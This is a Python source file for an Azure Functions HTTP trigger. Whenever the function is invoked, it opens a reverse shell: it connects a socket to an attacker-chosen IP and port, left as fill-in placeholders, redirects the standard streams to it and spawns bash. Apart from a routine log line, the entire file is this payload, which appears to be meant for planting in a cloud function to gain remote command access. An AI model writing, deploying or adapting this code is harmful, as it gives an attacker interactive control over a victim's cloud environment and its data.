import logging
import os
import subprocess
import socket
import pty

import azure.functions as func

PORT = PORT_HERE_INTEGER
IP = "PUT YOUR IP HERE"

def shell():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("bash")

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    shell()
    return func.HttpResponse(msg, status_code=200)

